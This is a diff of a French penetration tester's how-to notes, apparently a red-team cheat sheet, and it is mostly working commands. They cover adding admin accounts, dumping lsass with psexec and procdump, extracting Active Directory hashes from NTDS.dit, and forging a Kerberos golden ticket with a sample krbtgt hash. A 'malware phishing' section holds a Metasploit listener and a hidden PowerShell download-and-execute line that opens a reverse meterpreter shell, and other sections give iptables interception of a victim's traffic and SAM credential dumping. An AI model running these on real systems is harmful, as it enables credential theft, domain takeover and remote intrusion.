@@ -2,16 +2,11 @@
 
 Des petits tutos pour bien utiliser les différents outils.
 
-
-
-
-
 ## How To - Every ways of PSExec
-
 
 ### add a local user account
 
-```
+``` cmd
 net user /add jdupond AWNzcek2382OD
 net localgroup administrators jdupond /add
 net localgroup administrators CONTOSO\jdurand /add
@@ -19,12 +14,11 @@ net localgroup administrators CONTOSO\jdurand /add
 
 ### procdump lsass.exe
 
-```
+``` bash
 psexec.py -c procdump.exe "$domain/$domuser:$userpassword@$cible" "-acceptEula -ma lsass.exe C:/windows/lsass.dmp"
 smbget -w $domain -U $domuser%$userpassword smb://$cible/ADMIN$/lsass.dmp
 psexec.py "$domain/$domuser:$userpassword@$cible" "del C:/windows/lsass.dmp" 
 ```
-
 
 ## How To - récupérer les passwords de tous les users de l'AD
 
@@ -36,7 +30,7 @@ Note : cette méthode est totalement déprécié par CrackMapExec.
 
 voir shadow copy
 
-```
+``` cmd
 vssadmin create shadow
 […]
 vssadmin delete shadows
@@ -52,31 +46,12 @@ pour sortir les tables intéressantes de la "main database of Active Directory".
 
 ### Sortir les hashes des utilisateurs
 
-
 * [site officiel](http://www.ntdsxtract.com/)
 * [download](http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip)
 
 `python ~/tools/NTDSXtract\ 1.0/dsusers.py ntds.dit.export/datatable.3 ntds.dit.export/link_table.5 --passwordhashes SYSTEM_ad --passwordhistory SYSTEM_ad > ad_full_extract_1`
 
 `~/git/ntdsxtract/dsusers.py datatable.3 link_table.4 ./ --syshive SYSTEM_ad --passwordhashes --passwordhistory --pwdformat ocl --lmoutfile tel_lm --ntoutfile tel_nt`
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 ## How To - Create and Use a Golden Ticket
 
@@ -87,13 +62,12 @@ You will need:
 * The NTLM hash of the `krbtgt` account: `25619bab39a137291b536a7bf42c6780`
 * The `samAccountName` of the user to impersonate (preferably a domain admin): `Administrator`
 
-
 ### With Impacket from Linux
-
 
 Create the ticket.
 `ticketer.py -nthash 25619bab39a137291b536a7bf42c6780 -domain-sid S-1-5-21-2894840767-735700-3593130334 -domain fra.evilcorp.lab2 Administrator`
-```
+
+``` text
 Impacket v0.9.19-dev - Copyright 2019 SecureAuth Corporation
 
 [*] Creating basic skeleton ticket and PAC Infos
@@ -124,36 +98,11 @@ Open Mimikatz and fire the commands:
 
 Create a golden ticket and save it to a file in current directory:
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 ## How To − Malware phising
 
 Lancer un listener metasploit qui enverra un meterpreter qui fera un callback HTTPS :
-```
+
+``` text
 cd /opt/metasploit/
 sudo app/msfconsole
 
@@ -166,9 +115,7 @@ exploit -j -z
 
 On peut ensuite voir les `sessions` et les `jobs`.
 
-
-
-```
+``` bash
 powershell -nop -windowstyle hidden -NonInteractive -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1');invoke-shellcode -Payload windows/meterpreter/reverse_https -Lhost xxx.xxx.xxx.xxx -Lport 8080
 ```
 
@@ -181,7 +128,7 @@ L'idée est de rajouter des règles de NAT pour rediriger uniquement le trafic v
 * Configurer Burp pour qu'il écoute en mode transparent (voir [ici](http://portswigger.net/burp/help/proxy_options_invisible.html)) pour comprendre pourquoi), pour cela il suffit de cocher la case "invisible" dans l'option du listener
 * autoriser l'IP forward
 
-```
+``` bash
 sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
 ```
 
@@ -211,7 +158,6 @@ sudo iptables -t nat -A PREROUTING -s $victime -d $siteWeb -p tcp --dport 443 -j
 
 ## How To - Lister les réseaux Wi-Fi environnants
 
-
 ``` bash
 sudo airmon-ng check wlan0
 sudo airodump-ng mon0
@@ -219,30 +165,11 @@ sudo airodump-ng mon0
 sudo airmon-ng stop mon0
 ```
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 ## How To - mount a VDI disk image
 
 Pour monter un disque d'une machine virtuelle (VM) créée avec VirtualBox, il est possible d'utiliser qemu-nbd :
 
-```
+``` bash
 sudo aptitude install qemu-kvm
 sudo modprobe nbd
 sudo qemu-nbd -c /dev/nbd0 image.vdi
@@ -257,8 +184,6 @@ sudo rmmod nbd
 
 [source](https://bethesignal.org/blog/2011/01/05/how-to-mount-virtualbox-vdi-image/)
 
-
-
 ## How To - dump avec Wireshark en user
 
 Pour capturer en tant qu'utilisateur avec wireshark il faut reconfigurer pour ajouter le groupe wireshark au système :
@@ -266,33 +191,28 @@ Pour capturer en tant qu'utilisateur avec wireshark il faut reconfigurer pour aj
 puis s'ajouter au groupe.
 (si on veut pas relancer la session, un petit `sudo su - <username>` et le tour est joué.)
 
-
-
 ## How To - recover passwords and secrets of local accounts on Windows
 
 ### new - method 1
 
 Il faut récupérer les fichiers `SAM`, `SYSTEM`, et `SECURITY` dans `WINDOWS/system32/config/` et les extraire avec `creddump7` :
 
-```
+``` bash
 ~/git/creddump7/pwdump.py SYSTEM SAM > pwdump.txt
 ~/git/creddump7/cachedump.py SYSTEM SECURITY true > cachedump.txt
 ~/git/creddump7/lsadump.py SYSTEM SECURITY true > lsadump.txt
 ```
 
-
 Voir aussi RedSnarf
-
 
 ### old - method 2
 
-```
+```bash
 bkhive WINDOWS/system32/config/system ~/winXPAD_syskey.txt
 samdump2 WINDOWS/system32/config/SAM ~/winXPAD_syskey.txt > ~/winXPAD_hashes.txt
 ```
 
 Y'a plus qu'à cracker les hashes du fichier `~/winXPAD_hashes.txt` !
-
 
 ## How To - Create a dm-crypt encrypted file
 
@@ -302,7 +222,7 @@ Utile pour créer un conteneur chiffré pour protéger les données PASSI par ex
 
 Création d'un fichier de 3 Go formaté en ext4 :
 
-```
+``` bash
 fallocate -l 3G conteneur.img
 cryptsetup luksFormat conteneur.img
 sudo cryptsetup luksOpen conteneur.img monImage
@@ -313,38 +233,42 @@ sudo cryptsetup luksClose monImage
 ### Utilisation
 
 Montage :
-```
+
+``` bash
 sudo cryptsetup luksOpen conteneur.img monImage
 sudo mount /dev/mapper/monImage conteneur/
 ```
 
 Démontage :
-```
+
+``` bash
 sudo umount conteneur/
 sudo cryptsetup luksClose monImage
 ```
 
-
 ## HowTo - Mettre en place frida sur un téléphone Android
 
-#### 1. S'assurer que le téléphone est rooté
+### 1. S'assurer que le téléphone est rooté
+
 et si c'est le cas, ne pas oublier d'activer l'option "accès root" dans les options développeurs
 
-#### 2. Vérifier que adb fonctionne**
+### 2. Vérifier que adb fonctionne
+
 Il est possible de connecter le téléphone en USB ou bien d'activer le débogage par réseau.
 TODO : expliquer la partie pour activer le débogage par réseau à l'aide de la commande `adb tcpip 4444`
 Note : avec Virtualbox et la kali en VM, les options usb sont restés en mode USB 2.0 et le cable utilisé était un câble USB 2.0 malgré qu'il soit sur un port USB 3.0.
 
-#### 3. Démarrer adb en mode root
+### 3. Démarrer adb en mode root
+
 sinon il n'est pas possible d'accéder aux autres applications : `adb root`
 
-#### 4. Envoyer et démarrer le démon frida !**
+### 4. Envoyer et démarrer le démon frida !**
 
-* Le récupérer sur https://github.com/frida/frida/releases et prendre la version `frida-server-x.x.x-android-arm.xz` ou `frida-server-x.x.x-android-arm64.xz` en fonction de l'architecture du téléphone (ou même les versions x86 si besoin).
+* Le récupérer sur <https://github.com/frida/frida/releases> et prendre la version `frida-server-x.x.x-android-arm.xz` ou `frida-server-x.x.x-android-arm64.xz` en fonction de l'architecture du téléphone (ou même les versions x86 si besoin).
 * L'envoyer sur le téléphone : `adb push frida-server-x.x.x-android-arm.xz /data/local/tmp/frida-server`
 * Le lancer en root `adb shell /data/local/tmp/frida-server` (pour s'assurer que le shell adb a bien les permissions root, il est possible de faire `adb shell id`)
 
-#### 5. Installer le client sur kali
+### 5. Installer le client sur kali
 
 ```bash
 sudo apt update
@@ -353,7 +277,7 @@ sudo usermod -a -G plugdev joe # si l'utilisateur n'appartient pas encore au gro
 sudo su - joe # pour recharger les permissions
 ```
 
-#### 6. Profit!
+### 6. Profit
 
 Il est maintenant possible de :
 
@@ -364,30 +288,26 @@ Il est maintenant possible de :
 
 (Le `-U` est utilisé car le téléphone est branché en USB)
 
-
-
 ## HowTo - Outrepasser le SSL pinning dans une application Android
 
-#### 0. 0b10 façons de faire
- 
+### 0. 0b10 façons de faire
+
 * Nativement, on liste les applications qui tournent (`frida-ps -Ua`) puis on s'y attache (`frida-trace -U com.example.app`).
 Mais parfois ça ne fonctionne pas, et ça necessite de lancer frida en root (pas toujours possible).
 
 * Via frida-gadget. Cela demande d'insérer le "Gadget" dans l'application mais permet de l'utiliser sans root.
 C'est cette méthode qui sera décrite ici.
 
-#### 1. S'assurer que frida est fonctionnel
+### 1. S'assurer que frida est fonctionnel
+
 Voir le HowTo sur frida et android
 
-#### 2. Décompresser l'application
+### 2. Décompresser l'application
+
 ```bash
 apktool d example.apk -o apktool_output
 ```
 
-#### 3. Insérer le gadget
+### 3. Insérer le gadget
 
-* Télécharger le gadget adéquat : https://github.com/frida/frida/releases et prendre la version `frida-gadget-12.0.8-android-arm64.so.xz` ou `frida-gadget-12.0.8-android-arm64.so.xz`.
-
-
-
-
+* Télécharger le gadget adéquat : <https://github.com/frida/frida/releases> et prendre la version `frida-gadget-12.0.8-android-arm64.so.xz` ou `frida-gadget-12.0.8-android-arm64.so.xz`.
